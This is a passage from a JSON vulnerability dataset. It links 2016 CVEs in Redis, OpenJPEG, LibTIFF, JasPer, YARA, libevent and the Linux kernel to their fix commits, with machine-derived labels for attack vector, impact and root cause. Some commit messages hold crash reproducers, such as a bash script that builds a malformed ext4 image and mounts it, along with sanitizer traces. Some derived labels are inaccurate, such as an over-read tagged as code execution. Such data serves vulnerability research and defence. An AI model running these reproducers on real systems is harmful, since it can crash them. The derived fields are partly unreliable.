successive commands are\nnot executed.","summary":"networking.c in Redis before 3.2.7 allows *Cross Protocol Scripting* because it lacks a check for POST and Host: strings, which are not valid in the Redis protocol (but commonly occur when an attack triggers an HTTP request to the Redis TCP port).","commit_message_1":"cross protocol scripting protection","Vulnerability Type":"Security Features","Attack Vector":"By sending specially-crafted data redirected from HTTP request to the Redis TCP port","Impact":"send SPAM mail, post News, get or send files from or to an FTP server, or send data to an HTTP server","Root Cause":"caused by improper validation of HTTP POST and HOST request","Attack Type":"remote attacker"},{"commit_id":"da940424816e11d624362ce080bc026adffa26e8","cve_id":"CVE-2016-10507","cwe_id":"CWE-190","commit_message":"Merge pull request #834 from trylab\/issue833\n\nFix issue 833.","summary":"Integer overflow vulnerability in the bmp24toimage function in convertbmp.c in OpenJPEG before 2.2.0 allows remote attackers to cause a denial of service (heap-based buffer over-read and application crash) via a crafted bmp file.","commit_message_1":"merge pull request # <number> from trylab\/issue833 fix issue <number>","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted bmp file","Impact":"cause a denial of service ( heap - based buffer over - read and application crash )","Root Cause":"caused by an integer overflow","Attack Type":"remote attacker"},{"commit_id":"d27ccf01c68a31ad62b33d2dc1ba2bb1eeaafe7b","cve_id":"CVE-2016-10506","cwe_id":"CWE-369","commit_message":"Avoid division by zero in opj_pi_next_rpcl, opj_pi_next_pcrl and opj_pi_next_cprl (#938)\n\nFixes issues with id:000026,sig:08,src:002419,op:int32,pos:60,val:+32 and\nid:000019,sig:08,src:001098,op:flip1,pos:49","summary":"Division-by-zero vulnerabilities in the functions opj_pi_next_cprl, opj_pi_next_pcrl, and opj_pi_next_rpcl in pi.c in OpenJPEG before 2.2.0 allow remote attackers to cause a denial of service (application crash) via crafted j2k files.","commit_message_1":"avoid division by zero in opj_pi_next_rpcl , opj_pi_next_pcrl and opj_pi_next_cprl ( # <number> )","Vulnerability Type":"Divide By Zero","Attack Vector":"via crafted j2k files","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by division-by-zero","Attack Type":"remote attacker"},{"commit_id":"397f62c0a838e15d667ef50e27d5d011d2c79c04","cve_id":"CVE-2016-10504","cwe_id":"CWE-119","commit_message":"Fix write heap buffer overflow in opj_mqc_byteout(). Discovered by Ke Liu of Tencent's Xuanwu LAB (#835)","summary":"Heap-based buffer overflow vulnerability in the opj_mqc_byteout function in mqc.c in OpenJPEG before 2.2.0 allows remote attackers to cause a denial of service (application crash) via a crafted bmp file.","commit_message_1":"fix write heap buffer overflow in opj_mqc_byteout ( )","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted bmp file","Impact":"cause a denial of service ( application crash )","Root Cause":"caused by improper bounds checking by the opj_mqc_byteout function","Attack Type":"remote attacker"},{"commit_id":"fd85f8c94182558ff1480d06a236d6fb927979a3","cve_id":"CVE-2016-10375","cwe_id":"CWE-119","commit_message":"fixed invalid memory reads detected by the address sanitizer","summary":"Yodl before 3.07.01 has a Buffer Over-read in the queue_push function in queue\/queuepush.c.","commit_message_1":"fixed invalid memory read detected by the address sanitizer","Vulnerability Type":"buffer overflow","Attack Vector":"By sending a specially-crafted request","Impact":"overflow a buffer and execute arbitrary code","Root Cause":"caused by an buffer over-read flaw","Attack Type":"local attacker"},{"commit_id":"163ae1c6ad6299b19e22b4a35d5ab24a89791a98","cve_id":"CVE-2016-10318","cwe_id":"CWE-264","commit_message":"fscrypto: add authorization check for setting encryption policy\n\nOn an ext4 or f2fs filesystem with file encryption supported, a user\ncould set an encryption policy on any empty directory(*) to which they\nhad readonly access.  This is obviously problematic, since such a\ndirectory might be owned by another user and the new encryption policy\nwould prevent that other user from creating files in their own directory\n(for example).\n\nFix this by requiring inode_owner_or_capable() permission to set an\nencryption policy.  This means that either the caller must own the file,\nor the caller must have the capability CAP_FOWNER.\n\n(*) Or also on any regular file, for f2fs v4.6 and later and ext4\n    v4.8-rc1 and later; a separate bug fix is coming for that.\n\nSigned-off-by: Eric Biggers <ebiggers@google.com>\nCc: stable@vger.kernel.org # 4.1+; check fs\/{ext4,f2fs}\nSigned-off-by: Theodore Ts'o <tytso@mit.edu>","summary":"A missing authorization check in the fscrypt_process_policy function in fs\/crypto\/policy.c in the ext4 and f2fs filesystem encryption support in the Linux kernel before 4.7.4 allows a user to assign an encryption policy to a directory owned by a different user, potentially creating a denial of service.","commit_message_1":"add authorization check for setting encryption policy on an ext4 or f2fs filesystem with file encryption supported , a user could set an encryption policy on any empty directory ( * ) to which they had readonly access","Vulnerability Type":"Permissions, Privileges, and Access Controls","Attack Vector":"A missing authorization check in the fscrypt_process_policy function in fs\/crypto\/policy.c","Impact":"assign an encryption policy to a directory owned by a different user , potentially creating a denial of service","Root Cause":"caused by a missing authorization check","Attack Type":"attacker"},{"commit_id":"9657bbe3cdce4aaa90e07d50c1c70ae52da0ba6a","cve_id":"CVE-2016-10272","cwe_id":"CWE-119","commit_message":"* tools\/tiffcrop.c: fix readContigStripsIntoBuffer() in -i (ignore) mode so\nthat the output buffer is correctly incremented to avoid write outside bounds.\nReported by Agostino Sarubbo.\nFixes http:\/\/bugzilla.maptools.org\/show_bug.cgi?id=2620","summary":"LibTIFF 4.0.7 allows remote attackers to cause a denial of service (heap-based buffer overflow) or possibly have unspecified other impact via a crafted TIFF image, related to *WRITE of size 2048* and libtiff\/tif_next.c:64:9.","commit_message_1":"fix readcontigstripsintobuffer ( ) in -i ( ignore ) mode so that the output buffer is correctly incremented to avoid write outside bound","Vulnerability Type":"buffer overflow","Attack Vector":"via a crafted tiff image , related to * write of size 2048 * and libtiff \/ tif _ next . c : 64 : 9","Impact":"cause a denial of service ( heap - based buffer overflow ) or possibly have unspecified other impact","Root Cause":"caused by a heap-based buffer overflow related to \"WRITE of size 2048\" and libtiff\/tif_next.c","Attack Type":"remote attacker"},{"commit_id":"9a72a69e035ee70ff5c41541c8c61cd97990d018","cve_id":"CVE-2016-10270","cwe_id":"CWE-125","commit_message":"* libtiff\/tif_dirread.c: modify ChopUpSingleUncompressedStrip() to\ninstanciate compute ntrips as TIFFhowmany_32(td->td_imagelength, rowsperstrip),\ninstead of a logic based on the total size of data. Which is faulty is\nthe total size of data is not sufficient to fill the whole image, and thus\nresults in reading outside of the StripByCounts\/StripOffsets arrays when\nusing TIFFReadScanline().\nReported by Agostino Sarubbo.\nFixes http:\/\/bugzilla.maptools.org\/show_bug.cgi?id=2608.\n\n* libtiff\/tif_strip.c: revert the change in TIFFNumberOfStrips() done\nfor http:\/\/bugzilla.maptools.org\/show_bug.cgi?id=2587 \/ CVE-2016-9273 since\nthe above change is a better fix that makes it unnecessary.","summary":"LibTIFF 4.0.7 allows remote attackers to cause a denial of service (heap-based buffer over-read) or possibly have unspecified other impact via a crafted TIFF image, related to *READ of size 8* and libtiff\/tif_read.c:523:22.","commit_message_1":"modify chopupsingleuncompressedstrip ( ) to instanciate compute ntrips a tiffhowmany_32 ( td- > td_imagelength , rowsperstrip ) , instead of a logic based on the total size of data","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted tiff image , related to * read of size 8 * and libtiff \/ tif _ read . c : 523 : 22","Impact":"cause a denial of service ( heap - based buffer over - read ) or possibly have unspecified other impact","Root Cause":"caused by a heap-based buffer over-read related to \"READ of size 8\" and libtiff\/tif_read.c","Attack Type":"remote attacker"},{"commit_id":"1044b43637fa7f70fb19b93593777b78bd20da86","cve_id":"CVE-2016-10269","cwe_id":"CWE-125","commit_message":"* libtiff\/tif_pixarlog.c, libtiff\/tif_luv.c: fix heap-based buffer\noverflow on generation of PixarLog \/ LUV compressed files, with\nColorMap, TransferFunction attached and nasty plays with bitspersample.\nThe fix for LUV has not been tested, but suffers from the same kind\nof issue of PixarLog.\nReported by Agostino Sarubbo.\nFixes http:\/\/bugzilla.maptools.org\/show_bug.cgi?id=2604","summary":"LibTIFF 4.0.7 allows remote attackers to cause a denial of service (heap-based buffer over-read) or possibly have unspecified other impact via a crafted TIFF image, related to *READ of size 512* and libtiff\/tif_unix.c:340:2.","commit_message_1":"fix heap-based buffer overflow on generation of pixarlog \/ luv compressed file , with colormap , transferfunction attached and nasty play with bitspersample","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted tiff image , related to * read of size 512 * and libtiff \/ tif _ unix . c : 340 : 2","Impact":"cause a denial of service ( heap - based buffer over - read ) or possibly have unspecified other impact","Root Cause":"caused by a heap-based buffer over-read related to READ of size 512 and libtiff\/tif_unix.c","Attack Type":"remote attacker"},{"commit_id":"43bc256d8ae44b92d2734a3c5bc73957a4d7c1ec","cve_id":"CVE-2016-10267","cwe_id":"CWE-369","commit_message":"* libtiff\/tif_ojpeg.c: make OJPEGDecode() early exit in case of failure in\nOJPEGPreDecode(). This will avoid a divide by zero, and potential other issues.\nReported by Agostino Sarubbo.\nFixes http:\/\/bugzilla.maptools.org\/show_bug.cgi?id=2611","summary":"LibTIFF 4.0.7 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted TIFF image, related to libtiff\/tif_ojpeg.c:816:8.","commit_message_1":"make ojpegdecode ( ) early exit in case of failure in ojpegpredecode ( )","Vulnerability Type":"Divide By Zero","Attack Vector":"via a crafted tiff image , related to libtiff \/ tif _ ojpeg . c : 816 : 8","Impact":"cause a denial of service ( divide - by - zero error and application crash )","Root Cause":"caused by a divide-by-zero error","Attack Type":"remote attacker"},{"commit_id":"438274f938e046d33cb0e1230b41da32ffe223e1","cve_id":"CVE-2016-10266","cwe_id":"CWE-369","commit_message":"* libtiff\/tif_read.c, libtiff\/tiffiop.h: fix uint32 overflow in\nTIFFReadEncodedStrip() that caused an integer division by zero.\nReported by Agostino Sarubbo.\nFixes http:\/\/bugzilla.maptools.org\/show_bug.cgi?id=2596","summary":"LibTIFF 4.0.7 allows remote attackers to cause a denial of service (divide-by-zero error and application crash) via a crafted TIFF image, related to libtiff\/tif_read.c:351:22.","commit_message_1":"fix uint32 overflow in tiffreadencodedstrip ( ) that caused an integer division by zero","Vulnerability Type":"Divide By Zero","Attack Vector":"via a crafted tiff image , related to libtiff \/ tif _ read . c : 351 : 22","Impact":"cause a denial of service ( divide - by - zero error and application crash )","Root Cause":"caused by a divide-by-zero error","Attack Type":"remote attacker"},{"commit_id":"bdfe95a6e81ffb4b2fad31a76b57943695beed20","cve_id":"CVE-2016-10250","cwe_id":"CWE-476","commit_message":"Fixed another problem with incorrect cleanup of JP2 box data upon error.","summary":"The jp2_colr_destroy function in jp2_cod.c in JasPer before 1.900.13 allows remote attackers to cause a denial of service (NULL pointer dereference) by leveraging incorrect cleanup of JP2 box data on error. NOTE: this vulnerability exists because of an incomplete fix for CVE-2016-8887.","commit_message_1":"fixed another problem with incorrect cleanup of jp2 box data upon error","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"by leveraging incorrect cleanup of jp2 box data on error","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"988f8365f7d8ad8073b6786e433d34c553ecf568","cve_id":"CVE-2016-10249","cwe_id":"CWE-190","commit_message":"Fixed an integer overflow problem.","summary":"Integer overflow in the jpc_dec_tiledecode function in jpc_dec.c in JasPer before 1.900.12 allows remote attackers to have unspecified impact via a crafted image file, which triggers a heap-based buffer overflow.","commit_message_1":"fixed an integer overflow problem","Vulnerability Type":"integer overflow","Attack Vector":"via a crafted image file , which triggers a heap - based buffer overflow","Impact":"have unspecified impact","Root Cause":"caused by improper bounds checking by jpc_dec_tiledecode function","Attack Type":"remote attacker"},{"commit_id":"2e82fa00466ae525339754bb3ab0a0474a31d4bd","cve_id":"CVE-2016-10248","cwe_id":"CWE-476","commit_message":"Fixed an integral type promotion problem by adding a JAS_CAST.\nModified the jpc_tsfb_synthesize function so that it will be a noop for\nan empty sequence (in order to avoid dereferencing a null pointer).","summary":"The jpc_tsfb_synthesize function in jpc_tsfb.c in JasPer before 1.900.9 allows remote attackers to cause a denial of service (NULL pointer dereference) via vectors involving an empty sequence.","commit_message_1":"fixed an integral type promotion problem by adding a jas_cast","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via vectors involving an empty sequence","Impact":"cause a denial of service ( pointer dereference )","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"197c949e7798fbf28cfadc69d9ca0c2abbf93191","cve_id":"CVE-2016-10229","cwe_id":"CWE-358","commit_message":"udp: properly support MSG_PEEK with truncated buffers\n\nBackport of this upstream commit into stable kernels :\n89c22d8c3b27 (\"net: Fix skb csum races when peeking\")\nexposed a bug in udp stack vs MSG_PEEK support, when user provides\na buffer smaller than skb payload.\n\nIn this case,\nskb_copy_and_csum_datagram_iovec(skb, sizeof(struct udphdr),\n                                 msg->msg_iov);\nreturns -EFAULT.\n\nThis bug does not happen in upstream kernels since Al Viro did a great\njob to replace this into :\nskb_copy_and_csum_datagram_msg(skb, sizeof(struct udphdr), msg);\nThis variant is safe vs short buffers.\n\nFor the time being, instead reverting Herbert Xu patch and add back\nskb->ip_summed invalid changes, simply store the result of\nudp_lib_checksum_complete() so that we avoid computing the checksum a\nsecond time, and avoid the problematic\nskb_copy_and_csum_datagram_iovec() call.\n\nThis patch can be applied on recent kernels as it avoids a double\nchecksumming, then backported to stable kernels as a bug fix.\n\nSigned-off-by: Eric Dumazet <edumazet@google.com>\nAcked-by: Herbert Xu <herbert@gondor.apana.org.au>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"udp.c in the Linux kernel before 4.5 allows remote attackers to execute arbitrary code via UDP traffic that triggers an unsafe second checksum calculation during execution of a recv system call with the MSG_PEEK flag.","commit_message_1":"properly support msg_peek with truncated buffer backport of this upstream commit into stable kernel : 89c22d8c3b27 ( `` net : fix skb csum race when peeking '' ) exposed a bug in udp stack v msg_peek support , when user provides a buffer smaller than skb payload","Vulnerability Type":"Improperly Implemented Security Check for Standard","Attack Vector":"via udp traffic that triggers an unsafe second checksum calculation during execution of a recv system call with the msg _ peek flag .","Impact":"execute arbitrary code","Root Cause":"caused by a flaw","Attack Type":"remote attacker"},{"commit_id":"890c3f850293176c0e996a602ffa88b315f4e98f","cve_id":"CVE-2016-10211","cwe_id":"CWE-416","commit_message":"Fix issue #575","summary":"libyara\/grammar.y in YARA 3.5.0 allows remote attackers to cause a denial of service (use-after-free and application crash) via a crafted rule that is mishandled in the yr_parser_lookup_loop_variable function.","commit_message_1":"fix issue # <number>","Vulnerability Type":"Use After Free","Attack Vector":"via a crafted rule that is mishandled in the yr _ parser _ lookup _ loop _ variable function ","Impact":"cause a denial of service ( use - after - free and application crash )","Root Cause":"caused by a use-after-free","Attack Type":"remote attacker"},{"commit_id":"3119b232c9c453c98d8fa8b6ae4e37ba18117cd4","cve_id":"CVE-2016-10210","cwe_id":"CWE-476","commit_message":"re_lexer: Make reading escape sequences more robust (#586)\n\n* Add test for issue #503\n\n* re_lexer: Make reading escape sequences more robust\n\nThis commit fixes parsing incomplete escape sequences at the end of a\nregular expression and parsing things like \\xxy (invalid hex digits)\nwhich before were silently turned into (char)255.\n\nClose #503\n\n* Update re_lexer.c","summary":"libyara\/lexer.l in YARA 3.5.0 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via a crafted rule that is mishandled in the yy_get_next_buffer function.","commit_message_1":"make reading escape sequence more robust ( # <number> ) * add test for issue # <number> * re_lexer : make reading escape sequence more robust this commit fix parsing incomplete escape sequence at the end of a regular expression and parsing thing like \\xxy ( invalid hex digit ) which before were silently turned into ( char ) <number>","Vulnerability Type":"NULL Pointer Dereference","Attack Vector":"via a crafted rule that is mishandled in the yy _ get _ next _ buffer function","Impact":"cause a denial of service ( pointer dereference and application crash )","Root Cause":"caused by a NULL pointer dereference","Attack Type":"remote attacker"},{"commit_id":"3a4b77cd47bb837b8557595ec7425f281f2ca1fe","cve_id":"CVE-2016-10208","cwe_id":"CWE-125","commit_message":"ext4: validate s_first_meta_bg at mount time\n\nRalf Spenneberg reported that he hit a kernel crash when mounting a\nmodified ext4 image. And it turns out that kernel crashed when\ncalculating fs overhead (ext4_calculate_overhead()), this is because\nthe image has very large s_first_meta_bg (debug code shows it's\n842150400), and ext4 overruns the memory in count_overhead() when\nsetting bitmap buffer, which is PAGE_SIZE.\n\next4_calculate_overhead():\n  buf = get_zeroed_page(GFP_NOFS);  <=== PAGE_SIZE buffer\n  blks = count_overhead(sb, i, buf);\n\ncount_overhead():\n  for (j = ext4_bg_num_gdb(sb, grp); j > 0; j--) { <=== j = 842150400\n          ext4_set_bit(EXT4_B2C(sbi, s++), buf);   <=== buffer overrun\n          count++;\n  }\n\nThis can be reproduced easily for me by this script:\n\n  #!\/bin\/bash\n  rm -f fs.img\n  mkdir -p \/mnt\/ext4\n  fallocate -l 16M fs.img\n  mke2fs -t ext4 -O bigalloc,meta_bg,^resize_inode -F fs.img\n  debugfs -w -R \"ssv first_meta_bg 842150400\" fs.img\n  mount -o loop fs.img \/mnt\/ext4\n\nFix it by validating s_first_meta_bg first at mount time, and\nrefusing to mount if its value exceeds the largest possible meta_bg\nnumber.\n\nReported-by: Ralf Spenneberg <ralf@os-t.de>\nSigned-off-by: Eryu Guan <guaneryu@gmail.com>\nSigned-off-by: Theodore Ts'o <tytso@mit.edu>\nReviewed-by: Andreas Dilger <adilger@dilger.ca>","summary":"The ext4_fill_super function in fs\/ext4\/super.c in the Linux kernel through 4.9.8 does not properly validate meta block groups, which allows physically proximate attackers to cause a denial of service (out-of-bounds read and system crash) via a crafted ext4 image.","commit_message_1":"validate s_first_meta_bg at mount time ralf spenneberg reported that he hit a kernel crash when mounting a modified ext4 image","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via a crafted ext4 image","Impact":"cause a denial of service ( out - of - bounds read and system crash )","Root Cause":"does not properly validate meta block groups","Attack Type":"local attacker"},{"commit_id":"32c231164b762dddefa13af5a0101032c70b50ef","cve_id":"CVE-2016-10200","cwe_id":"CWE-416","commit_message":"l2tp: fix racy SOCK_ZAPPED flag check in l2tp_ip{,6}_bind()\n\nLock socket before checking the SOCK_ZAPPED flag in l2tp_ip6_bind().\nWithout lock, a concurrent call could modify the socket flags between\nthe sock_flag(sk, SOCK_ZAPPED) test and the lock_sock() call. This way,\na socket could be inserted twice in l2tp_ip6_bind_table. Releasing it\nwould then leave a stale pointer there, generating use-after-free\nerrors when walking through the list or modifying adjacent entries.\n\nBUG: KASAN: use-after-free in l2tp_ip6_close+0x22e\/0x290 at addr ffff8800081b0ed8\nWrite of size 8 by task syz-executor\/10987\nCPU: 0 PID: 10987 Comm: syz-executor Not tainted 4.8.0+ #39\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.8.2-0-g33fbe13 by qemu-project.org 04\/01\/2014\n ffff880031d97838 ffffffff829f835b ffff88001b5a1640 ffff8800081b0ec0\n ffff8800081b15a0 ffff8800081b6d20 ffff880031d97860 ffffffff8174d3cc\n ffff880031d978f0 ffff8800081b0e80 ffff88001b5a1640 ffff880031d978e0\nCall Trace:\n [<ffffffff829f835b>] dump_stack+0xb3\/0x118 lib\/dump_stack.c:15\n [<ffffffff8174d3cc>] kasan_object_err+0x1c\/0x70 mm\/kasan\/report.c:156\n [<     inline     >] print_address_description mm\/kasan\/report.c:194\n [<ffffffff8174d666>] kasan_report_error+0x1f6\/0x4d0 mm\/kasan\/report.c:283\n [<     inline     >] kasan_report mm\/kasan\/report.c:303\n [<ffffffff8174db7e>] __asan_report_store8_noabort+0x3e\/0x40 mm\/kasan\/report.c:329\n [<     inline     >] __write_once_size .\/include\/linux\/compiler.h:249\n [<     inline     >] __hlist_del .\/include\/linux\/list.h:622\n [<     inline     >] hlist_del_init .\/include\/linux\/list.h:637\n [<ffffffff8579047e>] l2tp_ip6_close+0x22e\/0x290 net\/l2tp\/l2tp_ip6.c:239\n [<ffffffff850b2dfd>] inet_release+0xed\/0x1c0 net\/ipv4\/af_inet.c:415\n [<ffffffff851dc5a0>] inet6_release+0x50\/0x70 net\/ipv6\/af_inet6.c:422\n [<ffffffff84c4581d>] sock_release+0x8d\/0x1d0 net\/socket.c:570\n [<ffffffff84c45976>] sock_close+0x16\/0x20 net\/socket.c:1017\n [<ffffffff817a108c>] __fput+0x28c\/0x780 fs\/file_table.c:208\n [<ffffffff817a1605>] ____fput+0x15\/0x20 fs\/file_table.c:244\n [<ffffffff813774f9>] task_work_run+0xf9\/0x170\n [<ffffffff81324aae>] do_exit+0x85e\/0x2a00\n [<ffffffff81326dc8>] do_group_exit+0x108\/0x330\n [<ffffffff81348cf7>] get_signal+0x617\/0x17a0 kernel\/signal.c:2307\n [<ffffffff811b49af>] do_signal+0x7f\/0x18f0\n [<ffffffff810039bf>] exit_to_usermode_loop+0xbf\/0x150 arch\/x86\/entry\/common.c:156\n [<     inline     >] prepare_exit_to_usermode arch\/x86\/entry\/common.c:190\n [<ffffffff81006060>] syscall_return_slowpath+0x1a0\/0x1e0 arch\/x86\/entry\/common.c:259\n [<ffffffff85e4d726>] entry_SYSCALL_64_fastpath+0xc4\/0xc6\nObject at ffff8800081b0ec0, in cache L2TP\/IPv6 size: 1448\nAllocated:\nPID = 10987\n [ 1116.897025] [<ffffffff811ddcb6>] save_stack_trace+0x16\/0x20\n [ 1116.897025] [<ffffffff8174c736>] save_stack+0x46\/0xd0\n [ 1116.897025] [<ffffffff8174c9ad>] kasan_kmalloc+0xad\/0xe0\n [ 1116.897025] [<ffffffff8174cee2>] kasan_slab_alloc+0x12\/0x20\n [ 1116.897025] [<     inline     >] slab_post_alloc_hook mm\/slab.h:417\n [ 1116.897025] [<     inline     >] slab_alloc_node mm\/slub.c:2708\n [ 1116.897025] [<     inline     >] slab_alloc mm\/slub.c:2716\n [ 1116.897025] [<ffffffff817476a8>] kmem_cache_alloc+0xc8\/0x2b0 mm\/slub.c:2721\n [ 1116.897025] [<ffffffff84c4f6a9>] sk_prot_alloc+0x69\/0x2b0 net\/core\/sock.c:1326\n [ 1116.897025] [<ffffffff84c58ac8>] sk_alloc+0x38\/0xae0 net\/core\/sock.c:1388\n [ 1116.897025] [<ffffffff851ddf67>] inet6_create+0x2d7\/0x1000 net\/ipv6\/af_inet6.c:182\n [ 1116.897025] [<ffffffff84c4af7b>] __sock_create+0x37b\/0x640 net\/socket.c:1153\n [ 1116.897025] [<     inline     >] sock_create net\/socket.c:1193\n [ 1116.897025] [<     inline     >] SYSC_socket net\/socket.c:1223\n [ 1116.897025] [<ffffffff84c4b46f>] SyS_socket+0xef\/0x1b0 net\/socket.c:1203\n [ 1116.897025] [<ffffffff85e4d685>] entry_SYSCALL_64_fastpath+0x23\/0xc6\nFreed:\nPID = 10987\n [ 1116.897025] [<ffffffff811ddcb6>] save_stack_trace+0x16\/0x20\n [ 1116.897025] [<ffffffff8174c736>] save_stack+0x46\/0xd0\n [ 1116.897025] [<ffffffff8174cf61>] kasan_slab_free+0x71\/0xb0\n [ 1116.897025] [<     inline     >] slab_free_hook mm\/slub.c:1352\n [ 1116.897025] [<     inline     >] slab_free_freelist_hook mm\/slub.c:1374\n [ 1116.897025] [<     inline     >] slab_free mm\/slub.c:2951\n [ 1116.897025] [<ffffffff81748b28>] kmem_cache_free+0xc8\/0x330 mm\/slub.c:2973\n [ 1116.897025] [<     inline     >] sk_prot_free net\/core\/sock.c:1369\n [ 1116.897025] [<ffffffff84c541eb>] __sk_destruct+0x32b\/0x4f0 net\/core\/sock.c:1444\n [ 1116.897025] [<ffffffff84c5aca4>] sk_destruct+0x44\/0x80 net\/core\/sock.c:1452\n [ 1116.897025] [<ffffffff84c5ad33>] __sk_free+0x53\/0x220 net\/core\/sock.c:1460\n [ 1116.897025] [<ffffffff84c5af23>] sk_free+0x23\/0x30 net\/core\/sock.c:1471\n [ 1116.897025] [<ffffffff84c5cb6c>] sk_common_release+0x28c\/0x3e0 .\/include\/net\/sock.h:1589\n [ 1116.897025] [<ffffffff8579044e>] l2tp_ip6_close+0x1fe\/0x290 net\/l2tp\/l2tp_ip6.c:243\n [ 1116.897025] [<ffffffff850b2dfd>] inet_release+0xed\/0x1c0 net\/ipv4\/af_inet.c:415\n [ 1116.897025] [<ffffffff851dc5a0>] inet6_release+0x50\/0x70 net\/ipv6\/af_inet6.c:422\n [ 1116.897025] [<ffffffff84c4581d>] sock_release+0x8d\/0x1d0 net\/socket.c:570\n [ 1116.897025] [<ffffffff84c45976>] sock_close+0x16\/0x20 net\/socket.c:1017\n [ 1116.897025] [<ffffffff817a108c>] __fput+0x28c\/0x780 fs\/file_table.c:208\n [ 1116.897025] [<ffffffff817a1605>] ____fput+0x15\/0x20 fs\/file_table.c:244\n [ 1116.897025] [<ffffffff813774f9>] task_work_run+0xf9\/0x170\n [ 1116.897025] [<ffffffff81324aae>] do_exit+0x85e\/0x2a00\n [ 1116.897025] [<ffffffff81326dc8>] do_group_exit+0x108\/0x330\n [ 1116.897025] [<ffffffff81348cf7>] get_signal+0x617\/0x17a0 kernel\/signal.c:2307\n [ 1116.897025] [<ffffffff811b49af>] do_signal+0x7f\/0x18f0\n [ 1116.897025] [<ffffffff810039bf>] exit_to_usermode_loop+0xbf\/0x150 arch\/x86\/entry\/common.c:156\n [ 1116.897025] [<     inline     >] prepare_exit_to_usermode arch\/x86\/entry\/common.c:190\n [ 1116.897025] [<ffffffff81006060>] syscall_return_slowpath+0x1a0\/0x1e0 arch\/x86\/entry\/common.c:259\n [ 1116.897025] [<ffffffff85e4d726>] entry_SYSCALL_64_fastpath+0xc4\/0xc6\nMemory state around the buggy address:\n ffff8800081b0d80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n ffff8800081b0e00: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc\n>ffff8800081b0e80: fc fc fc fc fc fc fc fc fb fb fb fb fb fb fb fb\n                                                    ^\n ffff8800081b0f00: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n ffff8800081b0f80: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb\n\n==================================================================\n\nThe same issue exists with l2tp_ip_bind() and l2tp_ip_bind_table.\n\nFixes: c51ce49735c1 (\"l2tp: fix oops in L2TP IP sockets for connect() AF_UNSPEC case\")\nReported-by: Baozeng Ding <sploving1@gmail.com>\nReported-by: Andrey Konovalov <andreyknvl@google.com>\nTested-by: Baozeng Ding <sploving1@gmail.com>\nSigned-off-by: Guillaume Nault <g.nault@alphalink.fr>\nSigned-off-by: David S. Miller <davem@davemloft.net>","summary":"Race condition in the L2TPv3 IP Encapsulation feature in the Linux kernel before 4.8.14 allows local users to gain privileges or cause a denial of service (use-after-free) by making multiple bind system calls without properly ascertaining whether a socket has the SOCK_ZAPPED status, related to net\/l2tp\/l2tp_ip.c and net\/l2tp\/l2tp_ip6.c.","commit_message_1":"fix racy sock_zapped flag check in l2tp_ip { , <number> } _bind ( ) lock socket before checking the sock_zapped flag in l2tp_ip6_bind ( )","Vulnerability Type":"Use After Free","Attack Vector":"by making multiple bind system calls without properly ascertaining whether a socket has the sock _ zapped status , related to net \/ l2tp \/ l2tp _ ip . c and net \/ l2tp \/ l2tp _ ip6 . c","Impact":"gain privileges or cause a denial of service ( use - after - free )","Root Cause":"caused by a race condition","Attack Type":"local attacker"},{"commit_id":"ec65c42052d95d2c23d1d837136d1cf1d9ecef9e","cve_id":"CVE-2016-10197","cwe_id":"CWE-125","commit_message":"evdns: fix searching empty hostnames\n\nFrom #332:\n  Here follows a bug report by **Guido Vranken** via the _Tor bug bounty program_. Please credit Guido accordingly.\n\n  ## Bug report\n\n  The DNS code of Libevent contains this rather obvious OOB read:\n\n  ```c\n  static char *\n  search_make_new(const struct search_state *const state, int n, const char *const base_name) {\n      const size_t base_len = strlen(base_name);\n      const char need_to_append_dot = base_name[base_len - 1] == '.' ? 0 : 1;\n  ```\n\n  If the length of ```base_name``` is 0, then line 3125 reads 1 byte before the buffer. This will trigger a crash on ASAN-protected builds.\n\n  To reproduce:\n\n  Build libevent with ASAN:\n  ```\n  $ CFLAGS='-fomit-frame-pointer -fsanitize=address' .\/configure && make -j4\n  ```\n  Put the attached ```resolv.conf``` and ```poc.c``` in the source directory and then do:\n\n  ```\n  $ gcc -fsanitize=address -fomit-frame-pointer poc.c .libs\/libevent.a\n  $ .\/a.out\n  =================================================================\n  ==22201== ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60060000efdf at pc 0x4429da bp 0x7ffe1ed47300 sp 0x7ffe1ed472f8\n  READ of size 1 at 0x60060000efdf thread T0\n  ```\n\nP.S. we can add a check earlier, but since this is very uncommon, I didn't add it.\n\nFixes: #332","summary":"The search_make_new function in evdns.c in libevent before 2.1.6-beta allows attackers to cause a denial of service (out-of-bounds read) via an empty hostname.","commit_message_1":"fix searching empty hostnames from # <number> : here follows a bug report by * * guido vranken * * via the _tor bug bounty program_","Vulnerability Type":"Out-of-bounds Read","Attack Vector":"via an empty hostname","Impact":"cause a denial of service ( out - of - bounds read )","Root Cause":"caused by out-of-bounds read","Attack Type":"remote attacker"},{"commit_id":"329acc18a0768c21ba22522f01a5c7f46cacc4d5","cve_id":"CVE-2016-10196","cwe_id":"CWE-119","commit_message":"evutil_parse_sockaddr_port(): fix buffer overflow\n\n@asn-the-goblin-slayer:\n  \"Length between '[' and ']' is cast to signed 32 bit integer on line 1815. Is\n   the length is more than 2<<31 (INT_MAX), len will hold a negative value.\n   Consequently, it will pass the check at line 1816. Segfault happens at line\n   1819.\n\n   Generate a resolv.conf with generate-resolv.conf, then compile and run\n   poc.c. See entry-functions.txt for functions in tor that might be\n   vulnerable.\n\n   Please credit 'Guido Vranken' for this discovery through the Tor bug bounty\n   program.\"\n\nReproducer for gdb (https:\/\/gist.github.com\/azat\/be2b0d5e9417ba0dfe2c):\n  start\n  p (1ULL<<31)+1ULL\n  # $1 = 2147483649\n  p 